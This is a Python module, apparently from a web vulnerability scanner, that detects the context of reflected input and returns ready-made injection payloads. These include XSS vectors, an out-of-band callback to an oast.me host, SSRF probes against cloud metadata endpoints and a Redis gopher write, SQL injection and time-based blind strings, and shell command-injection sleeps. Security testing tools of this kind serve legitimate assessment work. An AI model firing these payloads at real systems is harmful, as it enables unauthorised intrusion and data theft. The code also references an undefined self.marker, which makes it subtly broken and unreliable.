import re


class ContextEngine:
    """
    Context-aware payload selection engine.
    Detects where user input lands and chooses correct payloads.
    """

    HTML = "html"
    ATTRIBUTE = "attribute"
    JS = "javascript"
    JSON = "json"
    URL = "url"
    UNKNOWN = "unknown"

    def detect_context(self, response_text: str, marker: str) -> str:
        if not response_text:
            return self.UNKNOWN

        idx = response_text.find(marker)

        if idx == -1:
            return self.UNKNOWN

        # small window around injection
        window = response_text[max(0, idx - 120): idx + 120]

        # JSON context
        if re.search(r'"\s*:\s*".*' + re.escape(marker), window):
            return self.JSON

        # JavaScript context
        if "<script" in window or "function(" in window:
            return self.JS

        # Attribute context
        if re.search(r'=\s*["\'].*' + re.escape(marker), window):
            return self.ATTRIBUTE

        # HTML body context
        if re.search(r'>[^<]*' + re.escape(marker), window):
            return self.HTML

        return self.UNKNOWN

    def get_payloads(self, context: str):
        # We use 'ctx' as a unique identifier for reflection tracking
        payloads = {
            self.HTML: [
                "<svg/onload=confirm(1)>",
                "<details/open/ontoggle=confirm(1)>",
                "<img src=x onerror=confirm(1)>",
                # OAST/Out-of-band trigger (if OAST is active)
                f"<img src='http://{self.marker}.oast.me/'>",
                "javascript:confirm(1)"
            ],

            self.ATTRIBUTE: [
                # Using autofocus to trigger without user interaction
                '\" autofocus onfocus=confirm(1) x=\"',
                '\' autofocus onfocus=confirm(1) y=\'',
                # Event handler bypass for large-area elements
                '\"/onmouseover=confirm(1)/style=display:block;width:1000px;height:1000px; \"'
            ],

            self.JS: [
                # Polyglot to break out of single, double, or backtick strings
                "'-confirm(1)-'",
                "\"-confirm(1)-\"",
                "`-confirm(1)-`",
                # Breaking out of a block and commenting out the rest
                "';confirm(1);//",
                "');confirm(1);//",
                "\"};confirm(1);//"
            ],

            self.JSON: [
                # Breaking JSON structures safely
                '\"};confirm(1);//',
                '\"}],\"a\":confirm(1)//',
                '\"],\"b\":confirm(1),\"c\":[\"'
            ],

            self.URL: [
                # SSRF Cloud & Local targets
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://127.0.0.1:80",
                "http://localhost:22",
                "gopher://127.0.0.1:6379/_SET%20test%20success"
            ],

            self.UNKNOWN: [
                # Multi-purpose logic bombs
                "' OR 1=1--",
                "\") OR 1=1--",
                # Time-based blind detection (Postgres/MSSQL/MySQL)
                "'; SELECT PG_SLEEP(5)--",
                "'; WAITFOR DELAY '0:0:5'--",
                # Command Injection (Unix/Win)
                "& sleep 5 &",
                "; sleep 5 ;",
                "`sleep 5`"
            ]
        }

        # Fallback to UNKNOWN if context is not found
        return payloads.get(context, payloads[self.UNKNOWN])